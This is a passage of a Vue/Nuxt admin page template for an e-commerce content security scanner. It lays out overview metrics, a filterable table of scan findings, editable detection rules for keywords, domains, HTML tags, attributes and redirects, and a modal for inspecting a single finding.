            <p class="text-xs text-muted-foreground font-mono">{{ scanStepText }}</p>
          </div>
        </div>
        <div class="text-right font-mono font-bold text-sm text-primary shrink-0">
          {{ scanProgress }}%
        </div>
      </div>
      <!-- Progress Bar -->
      <div class="w-full h-2 bg-muted rounded-full overflow-hidden relative z-10">
        <div 
          class="h-full bg-primary transition-all duration-500 rounded-full"
          :style="{ width: `${scanProgress}%` }"
        ></div>
      </div>
    </div>

    <!-- Primary Section Navigation Tabs -->
    <div class="flex items-center gap-2 border-b border-border">
      <button
        @click="mainTab = 'overview'"
        :class="cn(
          'flex items-center gap-2 px-4 py-3 text-xs sm:text-sm font-bold border-b-2 transition-all cursor-pointer whitespace-nowrap',
          mainTab === 'overview'
            ? 'border-primary text-primary font-extrabold'
            : 'border-transparent text-muted-foreground hover:text-foreground hover:border-border'
        )"
      >
        <SlidersHorizontal class="w-4 h-4" />
        <span>Overview</span>
      </button>

      <button
        @click="mainTab = 'results'"
        :class="cn(
          'flex items-center gap-2 px-4 py-3 text-xs sm:text-sm font-bold border-b-2 transition-all cursor-pointer whitespace-nowrap',
          mainTab === 'results'
            ? 'border-primary text-primary font-extrabold'
            : 'border-transparent text-muted-foreground hover:text-foreground hover:border-border'
        )"
      >
        <AlertTriangle class="w-4 h-4" />
        <span>Scan Results</span>
        <span class="px-2 py-0.5 rounded-full text-[10px] font-extrabold bg-rose-500/15 text-rose-600 dark:text-rose-400 border border-rose-500/30 ml-1">
          {{ summaryMetrics.critical + summaryMetrics.high + summaryMetrics.needsReview }}
        </span>
      </button>

      <button
        @click="mainTab = 'rules'"
        :class="cn(
          'flex items-center gap-2 px-4 py-3 text-xs sm:text-sm font-bold border-b-2 transition-all cursor-pointer whitespace-nowrap',
          mainTab === 'rules'
            ? 'border-primary text-primary font-extrabold'
            : 'border-transparent text-muted-foreground hover:text-foreground hover:border-border'
        )"
      >
        <Code2 class="w-4 h-4" />
        <span>Detection Rules</span>
        <span class="px-2 py-0.5 rounded-full text-[10px] font-bold bg-muted text-muted-foreground border border-border ml-1">
          {{ rules.length }}
        </span>
      </button>
    </div>

    <!-- ========================================== -->
    <!-- SECTION 1: OVERVIEW TAB -->
    <!-- ========================================== -->
    <div v-show="mainTab === 'overview'" class="space-y-6 animate-in fade-in duration-300">
      <!-- Summary Metrics Cards -->
      <div class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-5 gap-3 sm:gap-4">
        <!-- Total Scanned -->
        <div class="bg-card border border-border rounded-2xl p-4 sm:p-5 shadow-xs flex flex-col justify-between">
          <div class="flex items-center justify-between text-muted-foreground mb-3">
            <span class="text-[10px] font-bold uppercase tracking-widest">Total Scanned</span>
            <Layers class="w-4 h-4" />
          </div>
          <div>
            <p class="text-2xl sm:text-3xl font-display font-extrabold text-foreground">
              {{ summaryMetrics.total.toLocaleString() }}
            </p>
            <p class="text-[11px] text-muted-foreground mt-1 font-medium">
              4,120 Products, 186 Categories
            </p>
          </div>
        </div>

        <!-- Clean Rate -->
        <div class="bg-card border border-border rounded-2xl p-4 sm:p-5 shadow-xs flex flex-col justify-between">
          <div class="flex items-center justify-between text-emerald-600 dark:text-emerald-400 mb-3">
            <span class="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">Clean</span>
            <CheckCircle2 class="w-4 h-4" />
          </div>
          <div>
            <p class="text-2xl sm:text-3xl font-display font-extrabold text-emerald-600 dark:text-emerald-400">
              {{ summaryMetrics.clean.toLocaleString() }}
            </p>
            <p class="text-[11px] text-emerald-600/90 dark:text-emerald-400/90 mt-1 font-semibold">
              {{ summaryMetrics.cleanPercent }}% Compliant
            </p>
          </div>
        </div>

        <!-- Needs Review -->
        <div class="bg-card border border-border rounded-2xl p-4 sm:p-5 shadow-xs flex flex-col justify-between">
          <div class="flex items-center justify-between text-amber-600 dark:text-amber-400 mb-3">
            <span class="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">Needs Review</span>
            <Info class="w-4 h-4" />
          </div>
          <div>
            <p class="text-2xl sm:text-3xl font-display font-extrabold text-amber-600 dark:text-amber-400">
              {{ summaryMetrics.needsReview }}
            </p>
            <p class="text-[11px] text-muted-foreground mt-1 font-medium">
              Pending manual inspection
            </p>
          </div>
        </div>

        <!-- High Risk -->
        <div class="bg-card border border-border rounded-2xl p-4 sm:p-5 shadow-xs flex flex-col justify-between">
          <div class="flex items-center justify-between text-orange-600 dark:text-orange-400 mb-3">
            <span class="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">High Risk</span>
            <AlertTriangle class="w-4 h-4" />
          </div>
          <div>
            <p class="text-2xl sm:text-3xl font-display font-extrabold text-orange-600 dark:text-orange-400">
              {{ summaryMetrics.high }}
            </p>
            <p class="text-[11px] text-muted-foreground mt-1 font-medium">
              Dangerous links & attributes
            </p>
          </div>
        </div>

        <!-- Critical -->
        <div class="bg-card border border-rose-500/20 bg-rose-500/5 rounded-2xl p-4 sm:p-5 shadow-xs flex flex-col justify-between col-span-2 sm:col-span-1">
          <div class="flex items-center justify-between text-rose-600 dark:text-rose-400 mb-3">
            <span class="text-[10px] font-bold uppercase tracking-widest text-rose-600 dark:text-rose-400">Critical</span>
            <AlertOctagon class="w-4 h-4" />
          </div>
          <div>
            <p class="text-2xl sm:text-3xl font-display font-extrabold text-rose-600 dark:text-rose-400">
              {{ summaryMetrics.critical }}
            </p>
            <p class="text-[11px] text-rose-600/90 dark:text-rose-400/90 mt-1 font-semibold">
              Immediate action required
            </p>
          </div>
        </div>
      </div>

      <!-- Middle Grid: Detection Breakdown & Scanner Status -->
      <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
        <!-- Detection Method Breakdown -->
        <div class="lg:col-span-4 bg-card border border-border rounded-2xl p-5 shadow-xs flex flex-col justify-between space-y-4">
          <div>
            <h3 class="text-sm font-bold text-foreground flex items-center gap-2">
              <ShieldAlert class="w-4 h-4 text-primary" />
              Threats by Detector Type
            </h3>
            <p class="text-xs text-muted-foreground mt-0.5">Distribution of flagged payloads across rules</p>
          </div>

          <div class="space-y-3">
            <div>
              <div class="flex items-center justify-between text-xs font-semibold mb-1">
                <span class="text-foreground">Blacklisted Domains</span>
                <span class="text-muted-foreground">3 items</span>
              </div>
              <div class="w-full h-1.5 bg-muted rounded-full overflow-hidden">
                <div class="h-full bg-rose-500 rounded-full" style="width: 40%"></div>
              </div>
            </div>

            <div>
              <div class="flex items-center justify-between text-xs font-semibold mb-1">
                <span class="text-foreground">Dangerous HTML Tags (script/iframe)</span>
                <span class="text-muted-foreground">2 items</span>
              </div>
              <div class="w-full h-1.5 bg-muted rounded-full overflow-hidden">
                <div class="h-full bg-orange-500 rounded-full" style="width: 25%"></div>
              </div>
            </div>

            <div>
              <div class="flex items-center justify-between text-xs font-semibold mb-1">
                <span class="text-foreground">Event Handlers & JS Attributes</span>
                <span class="text-muted-foreground">2 items</span>
              </div>
              <div class="w-full h-1.5 bg-muted rounded-full overflow-hidden">
                <div class="h-full bg-amber-500 rounded-full" style="width: 25%"></div>
              </div>
            </div>

            <div>
              <div class="flex items-center justify-between text-xs font-semibold mb-1">
                <span class="text-foreground">Spam & Phishing Keywords</span>
                <span class="text-muted-foreground">2 items</span>
              </div>
              <div class="w-full h-1.5 bg-muted rounded-full overflow-hidden">
                <div class="h-full bg-blue-500 rounded-full" style="width: 25%"></div>
              </div>
            </div>
          </div>

          <div class="pt-3 border-t border-border flex items-center justify-between">
            <span class="text-xs text-muted-foreground font-medium">Active Rule Sets</span>
            <button 
              @click="mainTab = 'rules'" 
              class="text-xs font-bold text-primary hover:underline flex items-center gap-1"
            >
              Configure Rules <ArrowRight class="w-3 h-3" />
            </button>
          </div>
        </div>

        <!-- Recent Findings Compact Section -->
        <div class="lg:col-span-8 bg-card border border-border rounded-2xl p-5 shadow-xs space-y-4">
          <div class="flex items-center justify-between">
            <div>
              <h3 class="text-sm font-bold text-foreground flex items-center gap-2">
                <AlertTriangle class="w-4 h-4 text-amber-500" />
                Recent Flagged Findings
              </h3>
              <p class="text-xs text-muted-foreground mt-0.5">Latest high-priority security exceptions</p>
            </div>
            <button 
              @click="mainTab = 'results'"
              class="text-xs font-bold text-primary hover:underline flex items-center gap-1"
            >
              View All ({{ filteredFindings.length }}) <ArrowRight class="w-3 h-3" />
            </button>
          </div>

          <!-- Compact List of Findings -->
          <div class="divide-y divide-border border border-border rounded-xl overflow-hidden">
            <div 
              v-for="item in recentFindings" 
              :key="item.id"
              @click="openFindingDetail(item)"
              class="p-3.5 hover:bg-muted/30 transition-colors flex flex-col sm:flex-row sm:items-center justify-between gap-3 cursor-pointer group"
            >
              <div class="flex items-start gap-3 min-w-0">
                <div 
                  :class="cn(
                    'w-8 h-8 rounded-lg flex items-center justify-center shrink-0 mt-0.5',
                    item.status === 'Critical' ? 'bg-rose-500/10 text-rose-600' :
                    item.status === 'High Risk' ? 'bg-orange-500/10 text-orange-600' :
                    item.status === 'Needs Review' ? 'bg-amber-500/10 text-amber-600' : 'bg-emerald-500/10 text-emerald-600'
                  )"
                >
                  <component :is="getStatusBadge(item.status).icon" class="w-4 h-4" />
                </div>
                <div class="min-w-0 space-y-0.5">
                  <div class="flex items-center gap-2 flex-wrap">
                    <span class="text-xs font-bold text-foreground group-hover:text-primary transition-colors truncate max-w-[280px] sm:max-w-[340px]">
                      {{ item.contentName }}
                    </span>
                    <span class="text-[10px] font-mono text-muted-foreground bg-muted px-1.5 py-0.5 rounded">
                      {{ item.field }}
                    </span>
                  </div>
                  <p class="text-xs text-muted-foreground line-clamp-1">
                    {{ item.description }}
                  </p>
                </div>
              </div>

              <div class="flex items-center justify-between sm:justify-end gap-3 shrink-0 pt-2 sm:pt-0 border-t sm:border-t-0 border-border/50">
                <div class="text-right">
                  <span 
                    :class="cn(
                      'px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border',
                      item.status === 'Critical' ? 'bg-rose-500/10 text-rose-600 border-rose-500/20' :
                      item.status === 'High Risk' ? 'bg-orange-500/10 text-orange-600 border-orange-500/20' :
                      item.status === 'Needs Review' ? 'bg-amber-500/10 text-amber-600 border-amber-500/20' : 'bg-emerald-500/10 text-emerald-600 border-emerald-500/20'
                    )"
                  >
                    {{ item.status }}
                  </span>
                  <p class="text-[10px] text-muted-foreground mt-0.5">{{ item.scannedAt }}</p>
                </div>
                <button 
                  class="p-1.5 rounded-lg text-muted-foreground group-hover:text-primary hover:bg-muted transition-colors"
                  title="View finding details"
                >
                  <ChevronRight class="w-4 h-4" />
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- ========================================== -->
    <!-- SECTION 2: SCAN RESULTS TAB -->
    <!-- ========================================== -->
    <div v-show="mainTab === 'results'" class="space-y-4 animate-in fade-in duration-300">
      <!-- Search & Filters Toolbar -->
      <div class="bg-card border border-border rounded-2xl p-3.5 shadow-xs space-y-3">
        <div class="flex flex-col lg:flex-row items-stretch lg:items-center justify-between gap-3">
          <!-- Search Box -->
          <div class="relative flex-1">
            <Search class="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
            <input 
              v-model="searchQuery"
              type="text" 
              placeholder="Search content name, detected token, rule, or issue..." 
              class="w-full h-9 pl-9 pr-4 bg-background border border-input rounded-lg text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
            />
            <button 
              v-if="searchQuery" 
              @click="searchQuery = ''"
              class="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
            >
              <X class="w-3.5 h-3.5" />
            </button>
          </div>

          <!-- Filter Dropdowns Row -->
          <div class="flex items-center gap-2 flex-wrap sm:flex-nowrap">
            <!-- Content Type -->
            <select 
              v-model="filterContentType"
              class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="all">All Content Types</option>
              <option value="Product">Products</option>
              <option value="Category">Categories</option>
            </select>

            <!-- Status Filter -->
            <select 
              v-model="filterStatus"
              class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="all">All Statuses</option>
              <option value="Critical">Critical</option>
              <option value="High Risk">High Risk</option>
              <option value="Needs Review">Needs Review</option>
              <option value="Clean">Clean</option>
              <option value="Resolved">Resolved</option>
            </select>

            <!-- Severity Filter -->
            <select 
              v-model="filterSeverity"
              class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="all">All Severities</option>
              <option value="Critical">Critical</option>
              <option value="High">High</option>
              <option value="Medium">Medium</option>
              <option value="Low">Low</option>
            </select>

            <!-- Detector Filter -->
            <select 
              v-model="filterDetector"
              class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer hidden sm:block"
            >
              <option value="all">All Detectors</option>
              <option value="Keyword">Keyword</option>
              <option value="Domain">Domain</option>
              <option value="HTML">HTML</option>
              <option value="Attribute">Attribute</option>
              <option value="Redirect">Redirect</option>
              <option value="Hidden Content">Hidden Content</option>
              <option value="Obfuscation">Obfuscation</option>
            </select>

            <!-- Page Size Selector -->
            <div class="flex items-center gap-1.5 border-l border-border pl-2 shrink-0">
              <span class="text-[10px] uppercase font-bold tracking-wider text-muted-foreground hidden sm:inline">Show:</span>
              <select 
                v-model="itemsPerPage"
                class="h-9 px-2 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option :value="5">5 / page</option>
                <option :value="10">10 / page</option>
                <option :value="25">25 / page</option>
                <option :value="50">50 / page</option>
              </select>
            </div>

            <!-- Reset Button -->
            <button 
              v-if="searchQuery || filterContentType !== 'all' || filterStatus !== 'all' || filterSeverity !== 'all' || filterDetector !== 'all'"
              @click="resetFilters"
              class="h-9 px-3 text-xs font-bold text-muted-foreground hover:text-foreground hover:bg-muted rounded-lg transition-colors shrink-0"
              title="Reset all filters"
            >
              Reset
            </button>
          </div>
        </div>
      </div>

      <!-- Main Findings Table -->
      <div class="bg-card border border-border rounded-2xl overflow-hidden shadow-xs">
        <UiTable 
          :columns="scanResultColumns" 
          :data="paginatedFindings"
          empty-text="No security findings found"
          empty-description="No items match your active filters or search criteria."
          @row-click="openFindingDetail"
        >
          <!-- Status Cell -->
          <template #cell-status="{ item }">
            <span 
              :class="cn(
                'inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border whitespace-nowrap',
                item.status === 'Critical' ? 'bg-rose-500/10 text-rose-600 dark:text-rose-400 border-rose-500/30' :
                item.status === 'High Risk' ? 'bg-orange-500/10 text-orange-600 dark:text-orange-400 border-orange-500/30' :
                item.status === 'Needs Review' ? 'bg-amber-500/10 text-amber-600 dark:text-amber-400 border-amber-500/30' :
                item.status === 'Resolved' ? 'bg-blue-500/10 text-blue-600 dark:text-blue-400 border-blue-500/30' :
                'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border-emerald-500/30'
              )"
            >
              <component :is="getStatusBadge(item.status).icon" class="w-3 h-3" />
              <span>{{ item.status }}</span>
            </span>
          </template>

          <!-- Type Cell -->
          <template #cell-contentType="{ item }">
            <div class="flex items-center gap-1.5 text-xs font-semibold text-foreground">
              <Package v-if="item.contentType === 'Product'" class="w-3.5 h-3.5 text-primary shrink-0" />
              <Layers v-else class="w-3.5 h-3.5 text-blue-500 shrink-0" />
              <span>{{ item.contentType }}</span>
            </div>
          </template>

          <!-- Content Entity Name Cell -->
          <template #cell-contentName="{ item }">
            <div class="space-y-0.5 min-w-0">
              <p class="text-xs font-bold text-foreground hover:text-primary transition-colors line-clamp-1">
                {{ item.contentName }}
              </p>
              <p class="text-[10px] text-muted-foreground font-mono truncate">
                ID: {{ item.contentId }} · /{{ item.contentSlug }}
              </p>
            </div>
          </template>

          <!-- Field Cell -->
          <template #cell-field="{ item }">
            <span class="px-2 py-0.5 rounded bg-muted text-[11px] font-mono text-muted-foreground border border-border/50">
              {{ item.field }}
            </span>
          </template>

          <!-- Risk Score Cell -->
          <template #cell-riskScore="{ item }">
            <div class="flex items-center gap-2">
              <div class="w-12 h-2 bg-muted rounded-full overflow-hidden">
                <div 
                  :class="cn(
                    'h-full rounded-full',
                    item.riskScore >= 80 ? 'bg-rose-500' :
                    item.riskScore >= 50 ? 'bg-amber-500' : 'bg-emerald-500'
                  )"
                  :style="{ width: `${item.riskScore}%` }"
                ></div>
              </div>
              <span class="text-xs font-mono font-bold text-foreground">
                {{ item.riskScore }}
              </span>
            </div>
          </template>

          <!-- Findings Cell -->
          <template #cell-findings="{ item }">
            <div class="space-y-0.5">
              <p class="text-xs font-medium text-foreground line-clamp-1">
                {{ item.description }}
              </p>
              <div class="flex items-center gap-1 text-[10px] text-muted-foreground font-mono">
                <span class="font-bold text-rose-500 dark:text-rose-400">Match:</span>
                <span class="truncate max-w-[200px] bg-rose-500/10 px-1 rounded text-rose-600 dark:text-rose-400">
                  {{ item.matchedValue }}
                </span>
              </div>
            </div>
          </template>

          <!-- Scanned At Cell -->
          <template #cell-scannedAt="{ item }">
            <span class="text-xs text-muted-foreground font-mono">
              {{ item.scannedAt }}
            </span>
          </template>

          <!-- Actions Cell -->
          <template #cell-actions="{ item }">
            <div class="flex items-center justify-end gap-1.5">
              <button 
                @click.stop="openFindingDetail(item)"
                class="px-2.5 py-1 text-xs font-bold text-primary hover:bg-primary/10 rounded-lg transition-colors"
                title="View detailed finding"
              >
                Inspect
              </button>
            </div>
          </template>
        </UiTable>

        <!-- Pagination Controls -->
        <UiPagination 
          :current-page="currentPage"
          :total-pages="totalPages"
          :total-count="filteredFindings.length"
          :items-per-page="itemsPerPage"
          item-label="findings"
          @update:current-page="currentPage = $event"
        />
      </div>
    </div>

    <!-- ========================================== -->
    <!-- SECTION 3: DETECTION RULES TAB -->
    <!-- ========================================== -->
    <div v-show="mainTab === 'rules'" class="space-y-6 animate-in fade-in duration-300">
      <!-- Sub-Tabs for Detection Rules -->
      <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-border pb-3">
        <div class="flex items-center gap-2 overflow-x-auto custom-scrollbar pb-1 sm:pb-0">
          <button 
            v-for="sub in [
              { id: 'keywords', label: 'Keywords', count: rules.filter(r => r.type === 'keyword').length },
              { id: 'domains', label: 'Domains', count: rules.filter(r => r.type === 'domain').length },
              { id: 'html', label: 'Dangerous HTML', count: rules.filter(r => r.type === 'html').length },
              { id: 'attributes', label: 'Dangerous Attributes', count: rules.filter(r => r.type === 'attribute').length },
              { id: 'redirects', label: 'Redirect Rules', count: rules.filter(r => r.type === 'redirect').length }
            ]"
            :key="sub.id"
            @click="rulesSubTab = sub.id as any"
            :class="cn(
              'px-3.5 py-2 rounded-xl text-xs font-bold transition-all cursor-pointer whitespace-nowrap flex items-center gap-1.5',
              rulesSubTab === sub.id 
                ? 'bg-primary text-primary-foreground shadow-sm' 
                : 'text-muted-foreground hover:text-foreground hover:bg-muted'
            )"
          >
            <span>{{ sub.label }}</span>
            <span 
              :class="cn(
                'px-1.5 py-0.2 rounded-full text-[10px] font-bold',
                rulesSubTab === sub.id ? 'bg-primary-foreground/20 text-primary-foreground' : 'bg-muted text-muted-foreground'
              )"
            >
              {{ sub.count }}
            </span>
          </button>
        </div>

        <UiButton 
          @click="openAddRuleModal(
            rulesSubTab === 'keywords' ? 'keyword' :
            rulesSubTab === 'domains' ? 'domain' :
            rulesSubTab === 'html' ? 'html' :
            rulesSubTab === 'attributes' ? 'attribute' : 'redirect'
          )"
          size="sm"
          class="h-9 px-4 gap-1.5 font-bold text-xs shrink-0"
        >
          <Plus class="w-3.5 h-3.5" />
          <span>Add {{ 
            rulesSubTab === 'keywords' ? 'Keyword' :
            rulesSubTab === 'domains' ? 'Domain' :
            rulesSubTab === 'html' ? 'HTML Tag' :
            rulesSubTab === 'attributes' ? 'Attribute' : 'Redirect Rule'
          }}</span>
        </UiButton>
      </div>

      <!-- Rules Table -->
      <div class="bg-card border border-border rounded-2xl overflow-hidden shadow-xs">
        <div class="divide-y divide-border">
          <div 
            v-for="rule in filteredRules" 
            :key="rule.id"
            class="p-4 sm:p-5 flex flex-col sm:flex-row sm:items-center justify-between gap-4 hover:bg-muted/20 transition-colors"
          >
            <div class="space-y-1 min-w-0">
              <div class="flex items-center gap-2.5 flex-wrap">
                <span class="font-mono text-sm font-bold text-foreground bg-muted px-2.5 py-1 rounded-lg border border-border">
                  {{ rule.pattern }}
                </span>
                <span :class="cn('px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border', getSeverityBadge(rule.severity))">
                  {{ rule.severity }}
                </span>
                <span class="text-xs font-semibold text-muted-foreground">
                  {{ rule.category }}
                </span>
              </div>
              <p class="text-xs text-muted-foreground leading-relaxed">
                {{ rule.description }}
              </p>
              <div class="flex items-center gap-3 text-[11px] text-muted-foreground font-mono pt-1">
                <span>Rule ID: {{ rule.id }}</span>
                <span>•</span>
                <span>Matches Caught: <strong class="text-foreground">{{ rule.matchCount }}</strong></span>
                <span>•</span>
                <span>Updated: {{ rule.updatedAt }}</span>
              </div>
            </div>

            <!-- Rule Actions -->
            <div class="flex items-center gap-2 shrink-0 pt-2 sm:pt-0 border-t sm:border-t-0 border-border/50 justify-between sm:justify-end">
              <!-- Enable / Disable Switch -->
              <button 
                @click="toggleRuleStatus(rule)"
                :class="cn(
                  'px-3 py-1.5 rounded-xl text-xs font-bold border transition-colors flex items-center gap-1.5 cursor-pointer',
                  rule.enabled 
                    ? 'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border-emerald-500/30' 
                    : 'bg-muted text-muted-foreground border-border'
                )"
                :title="rule.enabled ? 'Click to disable' : 'Click to enable'"
              >
                <div :class="cn('w-2 h-2 rounded-full', rule.enabled ? 'bg-emerald-500' : 'bg-muted-foreground')"></div>
                <span>{{ rule.enabled ? 'Active' : 'Disabled' }}</span>
              </button>

              <button 
                @click="openEditRuleModal(rule)"
                class="p-2 rounded-xl text-muted-foreground hover:text-foreground hover:bg-muted transition-colors"
                title="Edit rule"
              >
                <Edit3 class="w-4 h-4" />
              </button>

              <button 
                @click="deleteRule(rule)"
                class="p-2 rounded-xl text-rose-500 hover:text-rose-600 hover:bg-rose-500/10 transition-colors"
                title="Delete rule"
              >
                <Trash2 class="w-4 h-4" />
              </button>
            </div>
          </div>

          <div v-if="filteredRules.length === 0" class="p-8 text-center text-muted-foreground space-y-2">
            <Code2 class="w-8 h-8 mx-auto text-muted-foreground/50" />
            <p class="text-sm font-semibold">No rules configured in this section.</p>
            <p class="text-xs">Click the Add Rule button above to create one.</p>
          </div>
        </div>
      </div>
    </div>

    <!-- ========================================== -->
    <!-- MODAL: FINDING DETAILS -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="isDetailModalOpen"
      :title="`Security Inspection: ${selectedFinding?.id || ''}`"
      :subtitle="`${selectedFinding?.contentType} Content Payload Analysis`"
      max-width="max-w-3xl"
      @close="closeFindingDetail"
    >
      <div v-if="selectedFinding" class="p-6 space-y-6 overflow-y-auto max-h-[75vh]">
        <!-- Overview Banner -->
        <div class="bg-muted/40 border border-border rounded-2xl p-4 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
          <div class="space-y-1 min-w-0">
            <div class="flex items-center gap-2">
              <span 
                :class="cn(
                  'px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border',
                  selectedFinding.status === 'Critical' ? 'bg-rose-500/10 text-rose-600 border-rose-500/30' :
                  selectedFinding.status === 'High Risk' ? 'bg-orange-500/10 text-orange-600 border-orange-500/30' :
                  selectedFinding.status === 'Needs Review' ? 'bg-amber-500/10 text-amber-600 border-amber-500/30' : 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30'
                )"
              >
                {{ selectedFinding.status }}
              </span>
              <span :class="cn('px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border', getSeverityBadge(selectedFinding.severity))">
                {{ selectedFinding.severity }} Severity
              </span>
            </div>
            <h3 class="text-base font-bold text-foreground truncate">
              {{ selectedFinding.contentName }}
            </h3>
            <p class="text-xs text-muted-foreground font-mono">
              Target Field: <strong class="text-foreground">{{ selectedFinding.field }}</strong> (Line ~{{ selectedFinding.lineOffset }})
            </p>
          </div>

          <div class="flex sm:flex-col items-center sm:items-end justify-between gap-1 shrink-0 bg-card p-3 rounded-xl border border-border">
            <span class="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">Threat Score</span>
            <span 
              :class="cn(
                'text-2xl font-display font-extrabold font-mono',
                selectedFinding.riskScore >= 80 ? 'text-rose-600 dark:text-rose-400' :
                selectedFinding.riskScore >= 50 ? 'text-amber-600 dark:text-amber-400' : 'text-emerald-600 dark:text-emerald-400'
              )"
            >
              {{ selectedFinding.riskScore }}<span class="text-xs text-muted-foreground font-normal">/100</span>
            </span>
          </div>
        </div>

        <!-- Detection Assessment -->
        <div class="space-y-2">
          <h4 class="text-xs font-bold uppercase tracking-wider text-muted-foreground">
            Detection Assessment
          </h4>
          <div class="bg-card border border-border rounded-xl p-4 space-y-2">
            <div class="flex items-center justify-between text-xs font-semibold">
              <span class="text-muted-foreground">Detector Engine:</span>
              <span class="text-foreground font-bold">{{ selectedFinding.detector }} Detector</span>
            </div>
            <div class="flex items-center justify-between text-xs font-semibold">
              <span class="text-muted-foreground">Triggered Rule:</span>
              <span class="text-foreground font-mono text-[11px] bg-muted px-2 py-0.5 rounded">{{ selectedFinding.ruleName }}</span>
            </div>
            <div class="flex items-center justify-between text-xs font-semibold">
              <span class="text-muted-foreground">Inspection Timestamp:</span>
              <span class="text-muted-foreground font-mono text-[11px]">{{ selectedFinding.scannedAt }}</span>
            </div>
            <p class="text-xs text-foreground font-medium pt-2 border-t border-border/60">
              {{ selectedFinding.description }}
            </p>
          </div>
        </div>

        <!-- Content Context Snippet with Highlight -->
        <div class="space-y-2">
          <div class="flex items-center justify-between">
            <h4 class="text-xs font-bold uppercase tracking-wider text-muted-foreground">
              Code & Content Context Snippet
            </h4>
            <span class="text-[10px] font-mono text-muted-foreground">
              Offset line {{ selectedFinding.lineOffset }}
            </span>
          </div>
          
          <div class="bg-slate-950 text-slate-100 rounded-xl p-4 font-mono text-xs leading-relaxed border border-slate-800 overflow-x-auto">
            <span class="text-slate-400">{{ selectedFinding.contextSnippetBefore }}</span>
            <mark class="bg-rose-500/30 text-rose-300 font-bold px-1.5 py-0.5 rounded border border-rose-500/50">
              {{ selectedFinding.contextSnippetMatched }}
            </mark>
            <span class="text-slate-400">{{ selectedFinding.contextSnippetAfter }}</span>
          </div>

          <div class="bg-muted/50 p-3 rounded-xl border border-border flex items-center justify-between text-xs">
            <span class="text-muted-foreground">Flagged String:</span>
            <code class="text-rose-600 dark:text-rose-400 font-bold font-mono text-[11px] truncate max-w-[360px]">
              {{ selectedFinding.matchedValue }}
            </code>
          </div>
        </div>

        <!-- Related Content Navigation Workflow -->
        <div class="space-y-2">
          <h4 class="text-xs font-bold uppercase tracking-wider text-muted-foreground">
            Remediation & Content Navigation
          </h4>
          <div class="bg-card border border-border rounded-xl p-4 space-y-3">
            <div class="flex items-center justify-between text-xs">
              <span class="text-muted-foreground">Target Entity:</span>
              <span class="font-bold text-foreground">{{ selectedFinding.contentName }}</span>
            </div>

            <div class="flex items-center gap-3 pt-2">
              <a 
                :href="selectedFinding.storefrontUrl" 
                target="_blank" 
                class="flex-1 h-9 px-3 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold flex items-center justify-center gap-1.5 border border-border transition-colors"
              >
                <ExternalLink class="w-3.5 h-3.5" />
                <span>View on Storefront</span>
              </a>

              <NuxtLink 
                :to="selectedFinding.adminEditUrl"
                class="flex-1 h-9 px-3 bg-primary hover:bg-primary/90 text-primary-foreground rounded-xl text-xs font-bold flex items-center justify-center gap-1.5 transition-colors shadow-xs"
              >
                <Edit3 class="w-3.5 h-3.5" />
                <span>Edit in Admin</span>
              </NuxtLink>
            </div>
            
            <p class="text-[11px] text-muted-foreground text-center italic">
              Workflow: Finding → View/Edit Content → Sanitize/Fix → Trigger Rescan
            </p>
          </div>
        </div>

        <!-- Action Controls -->
        <div class="pt-4 border-t border-border flex flex-col sm:flex-row items-center justify-between gap-3">
          <div class="flex items-center gap-2 w-full sm:w-auto">
            <button 
              @click="markFindingAsSafe(selectedFinding)"
              class="flex-1 sm:flex-none h-9 px-3.5 bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-600 dark:text-emerald-400 border border-emerald-500/30 rounded-xl text-xs font-bold transition-colors"
            >
              Mark as Safe
            </button>
            <button 
              @click="confirmFindingSuspicious(selectedFinding)"
              class="flex-1 sm:flex-none h-9 px-3.5 bg-rose-500/10 hover:bg-rose-500/20 text-rose-600 dark:text-rose-400 border border-rose-500/30 rounded-xl text-xs font-bold transition-colors"
            >
              Confirm Threat
            </button>
          </div>

          <div class="flex items-center gap-2 w-full sm:w-auto justify-end">
            <button 
              @click="rescanFinding(selectedFinding)"
              :disabled="isRescanningItem"
              class="flex-1 sm:flex-none h-9 px-3.5 bg-muted hover:bg-muted/80 text-foreground border border-border rounded-xl text-xs font-bold transition-colors flex items-center justify-center gap-1.5"
            >
              <RotateCcw :class="cn('w-3.5 h-3.5', isRescanningItem && 'animate-spin')" />
              <span>{{ isRescanningItem ? 'Rescanning...' : 'Rescan Entity' }}</span>
            </button>

            <button 
              @click="resolveFinding(selectedFinding)"
